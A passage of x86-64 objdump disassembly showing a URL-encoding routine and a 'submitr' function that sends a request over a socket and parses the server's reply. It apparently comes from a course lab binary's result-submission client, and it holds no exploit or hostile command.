  4022e0:	48 89 fb             	mov    %rdi,%rbx
  4022e3:	48 89 f5             	mov    %rsi,%rbp
  4022e6:	64 48 8b 04 25 28 00 	mov    %fs:0x28,%rax
  4022ed:	00 00 
  4022ef:	48 89 44 24 08       	mov    %rax,0x8(%rsp)
  4022f4:	31 c0                	xor    %eax,%eax
  4022f6:	48 c7 c1 ff ff ff ff 	mov    $0xffffffffffffffff,%rcx
  4022fd:	f2 ae                	repnz scas %es:(%rdi),%al
  4022ff:	48 89 ce             	mov    %rcx,%rsi
  402302:	48 f7 d6             	not    %rsi
  402305:	8d 46 ff             	lea    -0x1(%rsi),%eax
  402308:	eb 0f                	jmp    402319 <urlencode+0x41>
  40230a:	44 88 45 00          	mov    %r8b,0x0(%rbp)
  40230e:	48 8d 6d 01          	lea    0x1(%rbp),%rbp
  402312:	48 83 c3 01          	add    $0x1,%rbx
  402316:	44 89 e0             	mov    %r12d,%eax
  402319:	44 8d 60 ff          	lea    -0x1(%rax),%r12d
  40231d:	85 c0                	test   %eax,%eax
  40231f:	0f 84 a6 00 00 00    	je     4023cb <urlencode+0xf3>
  402325:	44 0f b6 03          	movzbl (%rbx),%r8d
  402329:	41 80 f8 2a          	cmp    $0x2a,%r8b
  40232d:	0f 94 c2             	sete   %dl
  402330:	41 80 f8 2d          	cmp    $0x2d,%r8b
  402334:	0f 94 c0             	sete   %al
  402337:	08 c2                	or     %al,%dl
  402339:	75 cf                	jne    40230a <urlencode+0x32>
  40233b:	41 80 f8 2e          	cmp    $0x2e,%r8b
  40233f:	74 c9                	je     40230a <urlencode+0x32>
  402341:	41 80 f8 5f          	cmp    $0x5f,%r8b
  402345:	74 c3                	je     40230a <urlencode+0x32>
  402347:	41 8d 40 d0          	lea    -0x30(%r8),%eax
  40234b:	3c 09                	cmp    $0x9,%al
  40234d:	76 bb                	jbe    40230a <urlencode+0x32>
  40234f:	41 8d 40 bf          	lea    -0x41(%r8),%eax
  402353:	3c 19                	cmp    $0x19,%al
  402355:	76 b3                	jbe    40230a <urlencode+0x32>
  402357:	41 8d 40 9f          	lea    -0x61(%r8),%eax
  40235b:	3c 19                	cmp    $0x19,%al
  40235d:	76 ab                	jbe    40230a <urlencode+0x32>
  40235f:	41 80 f8 20          	cmp    $0x20,%r8b
  402363:	74 54                	je     4023b9 <urlencode+0xe1>
  402365:	41 8d 40 e0          	lea    -0x20(%r8),%eax
  402369:	3c 5f                	cmp    $0x5f,%al
  40236b:	0f 96 c2             	setbe  %dl
  40236e:	41 80 f8 09          	cmp    $0x9,%r8b
  402372:	0f 94 c0             	sete   %al
  402375:	08 c2                	or     %al,%dl
  402377:	74 4d                	je     4023c6 <urlencode+0xee>
  402379:	45 0f b6 c0          	movzbl %r8b,%r8d
  40237d:	b9 88 36 40 00       	mov    $0x403688,%ecx
  402382:	ba 08 00 00 00       	mov    $0x8,%edx
  402387:	be 01 00 00 00       	mov    $0x1,%esi
  40238c:	48 89 e7             	mov    %rsp,%rdi
  40238f:	b8 00 00 00 00       	mov    $0x0,%eax
  402394:	e8 c7 ea ff ff       	callq  400e60 <__sprintf_chk@plt>
  402399:	0f b6 04 24          	movzbl (%rsp),%eax
  40239d:	88 45 00             	mov    %al,0x0(%rbp)
  4023a0:	0f b6 44 24 01       	movzbl 0x1(%rsp),%eax
  4023a5:	88 45 01             	mov    %al,0x1(%rbp)
  4023a8:	0f b6 44 24 02       	movzbl 0x2(%rsp),%eax
  4023ad:	88 45 02             	mov    %al,0x2(%rbp)
  4023b0:	48 8d 6d 03          	lea    0x3(%rbp),%rbp
  4023b4:	e9 59 ff ff ff       	jmpq   402312 <urlencode+0x3a>
  4023b9:	c6 45 00 2b          	movb   $0x2b,0x0(%rbp)
  4023bd:	48 8d 6d 01          	lea    0x1(%rbp),%rbp
  4023c1:	e9 4c ff ff ff       	jmpq   402312 <urlencode+0x3a>
  4023c6:	b8 ff ff ff ff       	mov    $0xffffffff,%eax
  4023cb:	48 8b 74 24 08       	mov    0x8(%rsp),%rsi
  4023d0:	64 48 33 34 25 28 00 	xor    %fs:0x28,%rsi
  4023d7:	00 00 
  4023d9:	75 09                	jne    4023e4 <urlencode+0x10c>
  4023db:	48 83 c4 10          	add    $0x10,%rsp
  4023df:	5b                   	pop    %rbx
  4023e0:	5d                   	pop    %rbp
  4023e1:	41 5c                	pop    %r12
  4023e3:	c3                   	retq   
  4023e4:	e8 f7 e8 ff ff       	callq  400ce0 <__stack_chk_fail@plt>

00000000004023e9 <submitr>:
  4023e9:	41 57                	push   %r15
  4023eb:	41 56                	push   %r14
  4023ed:	41 55                	push   %r13
  4023ef:	41 54                	push   %r12
  4023f1:	55                   	push   %rbp
  4023f2:	53                   	push   %rbx
  4023f3:	48 81 ec 58 a0 00 00 	sub    $0xa058,%rsp
  4023fa:	49 89 fc             	mov    %rdi,%r12
  4023fd:	89 74 24 04          	mov    %esi,0x4(%rsp)
  402401:	49 89 d7             	mov    %rdx,%r15
  402404:	49 89 ce             	mov    %rcx,%r14
  402407:	4c 89 44 24 08       	mov    %r8,0x8(%rsp)
  40240c:	4d 89 cd             	mov    %r9,%r13
  40240f:	48 8b ac 24 90 a0 00 	mov    0xa090(%rsp),%rbp
  402416:	00 
  402417:	64 48 8b 04 25 28 00 	mov    %fs:0x28,%rax
  40241e:	00 00 
  402420:	48 89 84 24 48 a0 00 	mov    %rax,0xa048(%rsp)
  402427:	00 
  402428:	31 c0                	xor    %eax,%eax
  40242a:	c7 44 24 1c 00 00 00 	movl   $0x0,0x1c(%rsp)
  402431:	00 
  402432:	ba 00 00 00 00       	mov    $0x0,%edx
  402437:	be 01 00 00 00       	mov    $0x1,%esi
  40243c:	bf 02 00 00 00       	mov    $0x2,%edi
  402441:	e8 2a ea ff ff       	callq  400e70 <socket@plt>
  402446:	85 c0                	test   %eax,%eax
  402448:	0f 88 9b 02 00 00    	js     4026e9 <submitr+0x300>
  40244e:	89 c3                	mov    %eax,%ebx
  402450:	4c 89 e7             	mov    %r12,%rdi
  402453:	e8 f8 e8 ff ff       	callq  400d50 <gethostbyname@plt>
  402458:	48 85 c0             	test   %rax,%rax
  40245b:	0f 84 d4 02 00 00    	je     402735 <submitr+0x34c>
  402461:	48 c7 44 24 22 00 00 	movq   $0x0,0x22(%rsp)
  402468:	00 00 
  40246a:	c7 44 24 2a 00 00 00 	movl   $0x0,0x2a(%rsp)
  402471:	00 
  402472:	66 c7 44 24 2e 00 00 	movw   $0x0,0x2e(%rsp)
  402479:	66 c7 44 24 20 02 00 	movw   $0x2,0x20(%rsp)
  402480:	48 63 50 14          	movslq 0x14(%rax),%rdx
  402484:	48 8b 40 18          	mov    0x18(%rax),%rax
  402488:	48 8b 30             	mov    (%rax),%rsi
  40248b:	48 8d 7c 24 24       	lea    0x24(%rsp),%rdi
  402490:	b9 0c 00 00 00       	mov    $0xc,%ecx
  402495:	e8 c6 e8 ff ff       	callq  400d60 <__memmove_chk@plt>
  40249a:	0f b7 44 24 04       	movzwl 0x4(%rsp),%eax
  40249f:	66 c1 c8 08          	ror    $0x8,%ax
  4024a3:	66 89 44 24 22       	mov    %ax,0x22(%rsp)
  4024a8:	ba 10 00 00 00       	mov    $0x10,%edx
  4024ad:	48 8d 74 24 20       	lea    0x20(%rsp),%rsi
  4024b2:	89 df                	mov    %ebx,%edi
  4024b4:	e8 87 e9 ff ff       	callq  400e40 <connect@plt>
  4024b9:	85 c0                	test   %eax,%eax
  4024bb:	0f 88 dc 02 00 00    	js     40279d <submitr+0x3b4>
  4024c1:	48 c7 c6 ff ff ff ff 	mov    $0xffffffffffffffff,%rsi
  4024c8:	b8 00 00 00 00       	mov    $0x0,%eax
  4024cd:	48 89 f1             	mov    %rsi,%rcx
  4024d0:	4c 89 ef             	mov    %r13,%rdi
  4024d3:	f2 ae                	repnz scas %es:(%rdi),%al
  4024d5:	48 89 ca             	mov    %rcx,%rdx
  4024d8:	48 f7 d2             	not    %rdx
  4024db:	48 89 f1             	mov    %rsi,%rcx
  4024de:	4c 89 ff             	mov    %r15,%rdi
  4024e1:	f2 ae                	repnz scas %es:(%rdi),%al
  4024e3:	48 f7 d1             	not    %rcx
  4024e6:	49 89 c8             	mov    %rcx,%r8
  4024e9:	48 89 f1             	mov    %rsi,%rcx
  4024ec:	4c 89 f7             	mov    %r14,%rdi
  4024ef:	f2 ae                	repnz scas %es:(%rdi),%al
  4024f1:	48 f7 d1             	not    %rcx
  4024f4:	4d 8d 44 08 fe       	lea    -0x2(%r8,%rcx,1),%r8
  4024f9:	48 89 f1             	mov    %rsi,%rcx
  4024fc:	48 8b 7c 24 08       	mov    0x8(%rsp),%rdi
  402501:	f2 ae                	repnz scas %es:(%rdi),%al
  402503:	48 89 c8             	mov    %rcx,%rax
  402506:	48 f7 d0             	not    %rax
  402509:	49 8d 4c 00 ff       	lea    -0x1(%r8,%rax,1),%rcx
  40250e:	48 8d 44 52 fd       	lea    -0x3(%rdx,%rdx,2),%rax
  402513:	48 8d 84 01 80 00 00 	lea    0x80(%rcx,%rax,1),%rax
  40251a:	00 
  40251b:	48 3d 00 20 00 00    	cmp    $0x2000,%rax
  402521:	0f 87 d0 02 00 00    	ja     4027f7 <submitr+0x40e>
  402527:	48 8d b4 24 40 40 00 	lea    0x4040(%rsp),%rsi
  40252e:	00 
  40252f:	b9 00 04 00 00       	mov    $0x400,%ecx
  402534:	b8 00 00 00 00       	mov    $0x0,%eax
  402539:	48 89 f7             	mov    %rsi,%rdi
  40253c:	f3 48 ab             	rep stos %rax,%es:(%rdi)
  40253f:	4c 89 ef             	mov    %r13,%rdi
  402542:	e8 91 fd ff ff       	callq  4022d8 <urlencode>
  402547:	85 c0                	test   %eax,%eax
  402549:	0f 88 1b 03 00 00    	js     40286a <submitr+0x481>
  40254f:	4c 8d ac 24 40 20 00 	lea    0x2040(%rsp),%r13
  402556:	00 
  402557:	41 54                	push   %r12
  402559:	48 8d 84 24 48 40 00 	lea    0x4048(%rsp),%rax
  402560:	00 
  402561:	50                   	push   %rax
  402562:	4d 89 f9             	mov    %r15,%r9
  402565:	4d 89 f0             	mov    %r14,%r8
  402568:	b9 18 36 40 00       	mov    $0x403618,%ecx
  40256d:	ba 00 20 00 00       	mov    $0x2000,%edx
  402572:	be 01 00 00 00       	mov    $0x1,%esi
  402577:	4c 89 ef             	mov    %r13,%rdi
  40257a:	b8 00 00 00 00       	mov    $0x0,%eax
  40257f:	e8 dc e8 ff ff       	callq  400e60 <__sprintf_chk@plt>
  402584:	48 c7 c1 ff ff ff ff 	mov    $0xffffffffffffffff,%rcx
  40258b:	b8 00 00 00 00       	mov    $0x0,%eax
  402590:	4c 89 ef             	mov    %r13,%rdi
  402593:	f2 ae                	repnz scas %es:(%rdi),%al
  402595:	48 89 ca             	mov    %rcx,%rdx
  402598:	48 f7 d2             	not    %rdx
  40259b:	48 8d 52 ff          	lea    -0x1(%rdx),%rdx
  40259f:	4c 89 ee             	mov    %r13,%rsi
  4025a2:	89 df                	mov    %ebx,%edi
  4025a4:	e8 a2 fb ff ff       	callq  40214b <rio_writen>
  4025a9:	48 83 c4 10          	add    $0x10,%rsp
  4025ad:	48 85 c0             	test   %rax,%rax
  4025b0:	0f 88 3f 03 00 00    	js     4028f5 <submitr+0x50c>
  4025b6:	89 de                	mov    %ebx,%esi
  4025b8:	48 8d 7c 24 30       	lea    0x30(%rsp),%rdi
  4025bd:	e8 49 fb ff ff       	callq  40210b <rio_readinitb>
  4025c2:	ba 00 20 00 00       	mov    $0x2000,%edx
  4025c7:	48 8d b4 24 40 20 00 	lea    0x2040(%rsp),%rsi
  4025ce:	00 
  4025cf:	48 8d 7c 24 30       	lea    0x30(%rsp),%rdi
  4025d4:	e8 5b fc ff ff       	callq  402234 <rio_readlineb>
  4025d9:	48 85 c0             	test   %rax,%rax
  4025dc:	0f 8e 82 03 00 00    	jle    402964 <submitr+0x57b>
  4025e2:	4c 8d 84 24 40 80 00 	lea    0x8040(%rsp),%r8
  4025e9:	00 
  4025ea:	48 8d 4c 24 1c       	lea    0x1c(%rsp),%rcx
  4025ef:	48 8d 94 24 40 60 00 	lea    0x6040(%rsp),%rdx
  4025f6:	00 
  4025f7:	be 8f 36 40 00       	mov    $0x40368f,%esi
  4025fc:	48 8d bc 24 40 20 00 	lea    0x2040(%rsp),%rdi
  402603:	00 
  402604:	b8 00 00 00 00       	mov    $0x0,%eax
  402609:	e8 b2 e7 ff ff       	callq  400dc0 <__isoc99_sscanf@plt>
  40260e:	48 8d b4 24 40 20 00 	lea    0x2040(%rsp),%rsi
  402615:	00 
  402616:	bf a6 36 40 00       	mov    $0x4036a6,%edi
  40261b:	b9 03 00 00 00       	mov    $0x3,%ecx
  402620:	f3 a6                	repz cmpsb %es:(%rdi),%ds:(%rsi)
  402622:	0f 97 c0             	seta   %al
  402625:	1c 00                	sbb    $0x0,%al
  402627:	84 c0                	test   %al,%al
  402629:	0f 84 b3 03 00 00    	je     4029e2 <submitr+0x5f9>
  40262f:	ba 00 20 00 00       	mov    $0x2000,%edx
  402634:	48 8d b4 24 40 20 00 	lea    0x2040(%rsp),%rsi
  40263b:	00 
  40263c:	48 8d 7c 24 30       	lea    0x30(%rsp),%rdi
  402641:	e8 ee fb ff ff       	callq  402234 <rio_readlineb>
  402646:	48 85 c0             	test   %rax,%rax
  402649:	7f c3                	jg     40260e <submitr+0x225>
  40264b:	48 b8 45 72 72 6f 72 	movabs $0x43203a726f727245,%rax
  402652:	3a 20 43 
  402655:	48 ba 6c 69 65 6e 74 	movabs $0x6e7520746e65696c,%rdx
  40265c:	20 75 6e 
  40265f:	48 89 45 00          	mov    %rax,0x0(%rbp)
  402663:	48 89 55 08          	mov    %rdx,0x8(%rbp)
  402667:	48 b8 61 62 6c 65 20 	movabs $0x206f7420656c6261,%rax
  40266e:	74 6f 20 
  402671:	48 ba 72 65 61 64 20 	movabs $0x6165682064616572,%rdx
  402678:	68 65 61 
  40267b:	48 89 45 10          	mov    %rax,0x10(%rbp)
  40267f:	48 89 55 18          	mov    %rdx,0x18(%rbp)
  402683:	48 b8 64 65 72 73 20 	movabs $0x6f72662073726564,%rax
  40268a:	66 72 6f 
  40268d:	48 ba 6d 20 74 68 65 	movabs $0x657220656874206d,%rdx
  402694:	20 72 65 
  402697:	48 89 45 20          	mov    %rax,0x20(%rbp)
  40269b:	48 89 55 28          	mov    %rdx,0x28(%rbp)
  40269f:	48 b8 73 75 6c 74 20 	movabs $0x72657320746c7573,%rax
  4026a6:	73 65 72 
  4026a9:	48 89 45 30          	mov    %rax,0x30(%rbp)
  4026ad:	c7 45 38 76 65 72 00 	movl   $0x726576,0x38(%rbp)
  4026b4:	89 df                	mov    %ebx,%edi
  4026b6:	e8 65 e6 ff ff       	callq  400d20 <close@plt>
  4026bb:	b8 ff ff ff ff       	mov    $0xffffffff,%eax
  4026c0:	48 8b 9c 24 48 a0 00 	mov    0xa048(%rsp),%rbx
  4026c7:	00 
  4026c8:	64 48 33 1c 25 28 00 	xor    %fs:0x28,%rbx
  4026cf:	00 00 
  4026d1:	0f 85 76 04 00 00    	jne    402b4d <submitr+0x764>
  4026d7:	48 81 c4 58 a0 00 00 	add    $0xa058,%rsp
  4026de:	5b                   	pop    %rbx
  4026df:	5d                   	pop    %rbp
  4026e0:	41 5c                	pop    %r12
  4026e2:	41 5d                	pop    %r13
  4026e4:	41 5e                	pop    %r14
  4026e6:	41 5f                	pop    %r15
  4026e8:	c3                   	retq   
  4026e9:	48 b8 45 72 72 6f 72 	movabs $0x43203a726f727245,%rax
  4026f0:	3a 20 43 
  4026f3:	48 ba 6c 69 65 6e 74 	movabs $0x6e7520746e65696c,%rdx
  4026fa:	20 75 6e 
  4026fd:	48 89 45 00          	mov    %rax,0x0(%rbp)
  402701:	48 89 55 08          	mov    %rdx,0x8(%rbp)
  402705:	48 b8 61 62 6c 65 20 	movabs $0x206f7420656c6261,%rax
  40270c:	74 6f 20 
  40270f:	48 ba 63 72 65 61 74 	movabs $0x7320657461657263,%rdx
  402716:	65 20 73 
  402719:	48 89 45 10          	mov    %rax,0x10(%rbp)
  40271d:	48 89 55 18          	mov    %rdx,0x18(%rbp)
  402721:	c7 45 20 6f 63 6b 65 	movl   $0x656b636f,0x20(%rbp)
  402728:	66 c7 45 24 74 00    	movw   $0x74,0x24(%rbp)
  40272e:	b8 ff ff ff ff       	mov    $0xffffffff,%eax
  402733:	eb 8b                	jmp    4026c0 <submitr+0x2d7>
  402735:	48 b8 45 72 72 6f 72 	movabs $0x44203a726f727245,%rax
  40273c:	3a 20 44 
  40273f:	48 ba 4e 53 20 69 73 	movabs $0x6e7520736920534e,%rdx
  402746:	20 75 6e 
  402749:	48 89 45 00          	mov    %rax,0x0(%rbp)
  40274d:	48 89 55 08          	mov    %rdx,0x8(%rbp)
  402751:	48 b8 61 62 6c 65 20 	movabs $0x206f7420656c6261,%rax
  402758:	74 6f 20 
  40275b:	48 ba 72 65 73 6f 6c 	movabs $0x2065766c6f736572,%rdx
  402762:	76 65 20 
  402765:	48 89 45 10          	mov    %rax,0x10(%rbp)
  402769:	48 89 55 18          	mov    %rdx,0x18(%rbp)
  40276d:	48 b8 73 65 72 76 65 	movabs $0x6120726576726573,%rax
  402774:	72 20 61 
  402777:	48 89 45 20          	mov    %rax,0x20(%rbp)
  40277b:	c7 45 28 64 64 72 65 	movl   $0x65726464,0x28(%rbp)
  402782:	66 c7 45 2c 73 73    	movw   $0x7373,0x2c(%rbp)
  402788:	c6 45 2e 00          	movb   $0x0,0x2e(%rbp)
  40278c:	89 df                	mov    %ebx,%edi
  40278e:	e8 8d e5 ff ff       	callq  400d20 <close@plt>
  402793:	b8 ff ff ff ff       	mov    $0xffffffff,%eax
  402798:	e9 23 ff ff ff       	jmpq   4026c0 <submitr+0x2d7>
  40279d:	48 b8 45 72 72 6f 72 	movabs $0x55203a726f727245,%rax
  4027a4:	3a 20 55 
  4027a7:	48 ba 6e 61 62 6c 65 	movabs $0x6f7420656c62616e,%rdx
  4027ae:	20 74 6f 
  4027b1:	48 89 45 00          	mov    %rax,0x0(%rbp)
  4027b5:	48 89 55 08          	mov    %rdx,0x8(%rbp)
  4027b9:	48 b8 20 63 6f 6e 6e 	movabs $0x7463656e6e6f6320,%rax
  4027c0:	65 63 74 
  4027c3:	48 ba 20 74 6f 20 74 	movabs $0x20656874206f7420,%rdx
  4027ca:	68 65 20 
  4027cd:	48 89 45 10          	mov    %rax,0x10(%rbp)
  4027d1:	48 89 55 18          	mov    %rdx,0x18(%rbp)
  4027d5:	c7 45 20 73 65 72 76 	movl   $0x76726573,0x20(%rbp)
  4027dc:	66 c7 45 24 65 72    	movw   $0x7265,0x24(%rbp)
  4027e2:	c6 45 26 00          	movb   $0x0,0x26(%rbp)
  4027e6:	89 df                	mov    %ebx,%edi
  4027e8:	e8 33 e5 ff ff       	callq  400d20 <close@plt>
  4027ed:	b8 ff ff ff ff       	mov    $0xffffffff,%eax
  4027f2:	e9 c9 fe ff ff       	jmpq   4026c0 <submitr+0x2d7>
  4027f7:	48 b8 45 72 72 6f 72 	movabs $0x52203a726f727245,%rax
  4027fe:	3a 20 52 
  402801:	48 ba 65 73 75 6c 74 	movabs $0x747320746c757365,%rdx
  402808:	20 73 74 
  40280b:	48 89 45 00          	mov    %rax,0x0(%rbp)
  40280f:	48 89 55 08          	mov    %rdx,0x8(%rbp)
  402813:	48 b8 72 69 6e 67 20 	movabs $0x6f6f7420676e6972,%rax
  40281a:	74 6f 6f 
  40281d:	48 ba 20 6c 61 72 67 	movabs $0x202e656772616c20,%rdx
  402824:	65 2e 20 
  402827:	48 89 45 10          	mov    %rax,0x10(%rbp)
  40282b:	48 89 55 18          	mov    %rdx,0x18(%rbp)
  40282f:	48 b8 49 6e 63 72 65 	movabs $0x6573616572636e49,%rax
  402836:	61 73 65 
  402839:	48 ba 20 53 55 42 4d 	movabs $0x5254494d42555320,%rdx
  402840:	49 54 52 
  402843:	48 89 45 20          	mov    %rax,0x20(%rbp)
  402847:	48 89 55 28          	mov    %rdx,0x28(%rbp)
  40284b:	48 b8 5f 4d 41 58 42 	movabs $0x46554258414d5f,%rax
  402852:	55 46 00 
  402855:	48 89 45 30          	mov    %rax,0x30(%rbp)
  402859:	89 df                	mov    %ebx,%edi
  40285b:	e8 c0 e4 ff ff       	callq  400d20 <close@plt>
  402860:	b8 ff ff ff ff       	mov    $0xffffffff,%eax
  402865:	e9 56 fe ff ff       	jmpq   4026c0 <submitr+0x2d7>
  40286a:	48 b8 45 72 72 6f 72 	movabs $0x52203a726f727245,%rax
  402871:	3a 20 52 
  402874:	48 ba 65 73 75 6c 74 	movabs $0x747320746c757365,%rdx
  40287b:	20 73 74 
  40287e:	48 89 45 00          	mov    %rax,0x0(%rbp)
  402882:	48 89 55 08          	mov    %rdx,0x8(%rbp)
  402886:	48 b8 72 69 6e 67 20 	movabs $0x6e6f6320676e6972,%rax
  40288d:	63 6f 6e 
  402890:	48 ba 74 61 69 6e 73 	movabs $0x6e6120736e696174,%rdx
  402897:	20 61 6e 
  40289a:	48 89 45 10          	mov    %rax,0x10(%rbp)
  40289e:	48 89 55 18          	mov    %rdx,0x18(%rbp)
  4028a2:	48 b8 20 69 6c 6c 65 	movabs $0x6c6167656c6c6920,%rax
  4028a9:	67 61 6c 
  4028ac:	48 ba 20 6f 72 20 75 	movabs $0x72706e7520726f20,%rdx
  4028b3:	6e 70 72 
  4028b6:	48 89 45 20          	mov    %rax,0x20(%rbp)
  4028ba:	48 89 55 28          	mov    %rdx,0x28(%rbp)
  4028be:	48 b8 69 6e 74 61 62 	movabs $0x20656c6261746e69,%rax
  4028c5:	6c 65 20 
  4028c8:	48 ba 63 68 61 72 61 	movabs $0x6574636172616863,%rdx
  4028cf:	63 74 65 
  4028d2:	48 89 45 30          	mov    %rax,0x30(%rbp)
  4028d6:	48 89 55 38          	mov    %rdx,0x38(%rbp)
  4028da:	66 c7 45 40 72 2e    	movw   $0x2e72,0x40(%rbp)
  4028e0:	c6 45 42 00          	movb   $0x0,0x42(%rbp)
  4028e4:	89 df                	mov    %ebx,%edi
  4028e6:	e8 35 e4 ff ff       	callq  400d20 <close@plt>
  4028eb:	b8 ff ff ff ff       	mov    $0xffffffff,%eax
  4028f0:	e9 cb fd ff ff       	jmpq   4026c0 <submitr+0x2d7>
  4028f5:	48 b8 45 72 72 6f 72 	movabs $0x43203a726f727245,%rax
  4028fc:	3a 20 43 
  4028ff:	48 ba 6c 69 65 6e 74 	movabs $0x6e7520746e65696c,%rdx
  402906:	20 75 6e 
  402909:	48 89 45 00          	mov    %rax,0x0(%rbp)
  40290d:	48 89 55 08          	mov    %rdx,0x8(%rbp)
  402911:	48 b8 61 62 6c 65 20 	movabs $0x206f7420656c6261,%rax
  402918:	74 6f 20 
  40291b:	48 ba 77 72 69 74 65 	movabs $0x6f74206574697277,%rdx
  402922:	20 74 6f 
  402925:	48 89 45 10          	mov    %rax,0x10(%rbp)
  402929:	48 89 55 18          	mov    %rdx,0x18(%rbp)
  40292d:	48 b8 20 74 68 65 20 	movabs $0x7365722065687420,%rax
  402934:	72 65 73 
  402937:	48 ba 75 6c 74 20 73 	movabs $0x7672657320746c75,%rdx
  40293e:	65 72 76 
  402941:	48 89 45 20          	mov    %rax,0x20(%rbp)
  402945:	48 89 55 28          	mov    %rdx,0x28(%rbp)
  402949:	66 c7 45 30 65 72    	movw   $0x7265,0x30(%rbp)
  40294f:	c6 45 32 00          	movb   $0x0,0x32(%rbp)
  402953:	89 df                	mov    %ebx,%edi
  402955:	e8 c6 e3 ff ff       	callq  400d20 <close@plt>
  40295a:	b8 ff ff ff ff       	mov    $0xffffffff,%eax
  40295f:	e9 5c fd ff ff       	jmpq   4026c0 <submitr+0x2d7>
  402964:	48 b8 45 72 72 6f 72 	movabs $0x43203a726f727245,%rax
  40296b:	3a 20 43 
  40296e:	48 ba 6c 69 65 6e 74 	movabs $0x6e7520746e65696c,%rdx
  402975:	20 75 6e 
  402978:	48 89 45 00          	mov    %rax,0x0(%rbp)
  40297c:	48 89 55 08          	mov    %rdx,0x8(%rbp)
  402980:	48 b8 61 62 6c 65 20 	movabs $0x206f7420656c6261,%rax
  402987:	74 6f 20 
  40298a:	48 ba 72 65 61 64 20 	movabs $0x7269662064616572,%rdx
  402991:	66 69 72 
  402994:	48 89 45 10          	mov    %rax,0x10(%rbp)
  402998:	48 89 55 18          	mov    %rdx,0x18(%rbp)
  40299c:	48 b8 73 74 20 68 65 	movabs $0x6564616568207473,%rax
  4029a3:	61 64 65 
  4029a6:	48 ba 72 20 66 72 6f 	movabs $0x72206d6f72662072,%rdx
  4029ad:	6d 20 72 
  4029b0:	48 89 45 20          	mov    %rax,0x20(%rbp)
  4029b4:	48 89 55 28          	mov    %rdx,0x28(%rbp)
  4029b8:	48 b8 65 73 75 6c 74 	movabs $0x657320746c757365,%rax
  4029bf:	20 73 65 
  4029c2:	48 89 45 30          	mov    %rax,0x30(%rbp)
  4029c6:	c7 45 38 72 76 65 72 	movl   $0x72657672,0x38(%rbp)
  4029cd:	c6 45 3c 00          	movb   $0x0,0x3c(%rbp)
  4029d1:	89 df                	mov    %ebx,%edi
  4029d3:	e8 48 e3 ff ff       	callq  400d20 <close@plt>
  4029d8:	b8 ff ff ff ff       	mov    $0xffffffff,%eax
  4029dd:	e9 de fc ff ff       	jmpq   4026c0 <submitr+0x2d7>
  4029e2:	ba 00 20 00 00       	mov    $0x2000,%edx
  4029e7:	48 8d b4 24 40 20 00 	lea    0x2040(%rsp),%rsi
  4029ee:	00 
  4029ef:	48 8d 7c 24 30       	lea    0x30(%rsp),%rdi
  4029f4:	e8 3b f8 ff ff       	callq  402234 <rio_readlineb>
  4029f9:	48 85 c0             	test   %rax,%rax
  4029fc:	0f 8e 90 00 00 00    	jle    402a92 <submitr+0x6a9>
  402a02:	44 8b 44 24 1c       	mov    0x1c(%rsp),%r8d
  402a07:	41 81 f8 c8 00 00 00 	cmp    $0xc8,%r8d
  402a0e:	0f 85 02 01 00 00    	jne    402b16 <submitr+0x72d>
  402a14:	48 8d b4 24 40 20 00 	lea    0x2040(%rsp),%rsi
  402a1b:	00 
  402a1c:	48 89 ef             	mov    %rbp,%rdi
  402a1f:	e8 8c e2 ff ff       	callq  400cb0 <strcpy@plt>
  402a24:	89 df                	mov    %ebx,%edi
  402a26:	e8 f5 e2 ff ff       	callq  400d20 <close@plt>
  402a2b:	bf a0 36 40 00       	mov    $0x4036a0,%edi
  402a30:	b9 04 00 00 00       	mov    $0x4,%ecx
  402a35:	48 89 ee             	mov    %rbp,%rsi
  402a38:	f3 a6                	repz cmpsb %es:(%rdi),%ds:(%rsi)
  402a3a:	0f 97 c0             	seta   %al
  402a3d:	1c 00                	sbb    $0x0,%al
  402a3f:	0f be c0             	movsbl %al,%eax
  402a42:	85 c0                	test   %eax,%eax
  402a44:	0f 84 76 fc ff ff    	je     4026c0 <submitr+0x2d7>
  402a4a:	bf a4 36 40 00       	mov    $0x4036a4,%edi
  402a4f:	b9 05 00 00 00       	mov    $0x5,%ecx
  402a54:	48 89 ee             	mov    %rbp,%rsi
  402a57:	f3 a6                	repz cmpsb %es:(%rdi),%ds:(%rsi)
  402a59:	0f 97 c0             	seta   %al
  402a5c:	1c 00                	sbb    $0x0,%al
  402a5e:	0f be c0             	movsbl %al,%eax
  402a61:	85 c0                	test   %eax,%eax
  402a63:	0f 84 57 fc ff ff    	je     4026c0 <submitr+0x2d7>
  402a69:	bf a9 36 40 00       	mov    $0x4036a9,%edi
  402a6e:	b9 03 00 00 00       	mov    $0x3,%ecx
  402a73:	48 89 ee             	mov    %rbp,%rsi
  402a76:	f3 a6                	repz cmpsb %es:(%rdi),%ds:(%rsi)
  402a78:	0f 97 c0             	seta   %al
  402a7b:	1c 00                	sbb    $0x0,%al
  402a7d:	0f be c0             	movsbl %al,%eax
  402a80:	85 c0                	test   %eax,%eax
  402a82:	0f 84 38 fc ff ff    	je     4026c0 <submitr+0x2d7>
  402a88:	b8 ff ff ff ff       	mov    $0xffffffff,%eax
  402a8d:	e9 2e fc ff ff       	jmpq   4026c0 <submitr+0x2d7>
  402a92:	48 b8 45 72 72 6f 72 	movabs $0x43203a726f727245,%rax
  402a99:	3a 20 43 
  402a9c:	48 ba 6c 69 65 6e 74 	movabs $0x6e7520746e65696c,%rdx
  402aa3:	20 75 6e 
  402aa6:	48 89 45 00          	mov    %rax,0x0(%rbp)
  402aaa:	48 89 55 08          	mov    %rdx,0x8(%rbp)
  402aae:	48 b8 61 62 6c 65 20 	movabs $0x206f7420656c6261,%rax
  402ab5:	74 6f 20 
  402ab8:	48 ba 72 65 61 64 20 	movabs $0x6174732064616572,%rdx
  402abf:	73 74 61 
  402ac2:	48 89 45 10          	mov    %rax,0x10(%rbp)
  402ac6:	48 89 55 18          	mov    %rdx,0x18(%rbp)
  402aca:	48 b8 74 75 73 20 6d 	movabs $0x7373656d20737574,%rax
  402ad1:	65 73 73 
  402ad4:	48 ba 61 67 65 20 66 	movabs $0x6d6f726620656761,%rdx
  402adb:	72 6f 6d 
  402ade:	48 89 45 20          	mov    %rax,0x20(%rbp)
  402ae2:	48 89 55 28          	mov    %rdx,0x28(%rbp)
  402ae6:	48 b8 20 72 65 73 75 	movabs $0x20746c7573657220,%rax
  402aed:	6c 74 20 
  402af0:	48 89 45 30          	mov    %rax,0x30(%rbp)
  402af4:	c7 45 38 73 65 72 76 	movl   $0x76726573,0x38(%rbp)
  402afb:	66 c7 45 3c 65 72    	movw   $0x7265,0x3c(%rbp)
  402b01:	c6 45 3e 00          	movb   $0x0,0x3e(%rbp)
  402b05:	89 df                	mov    %ebx,%edi
  402b07:	e8 14 e2 ff ff       	callq  400d20 <close@plt>
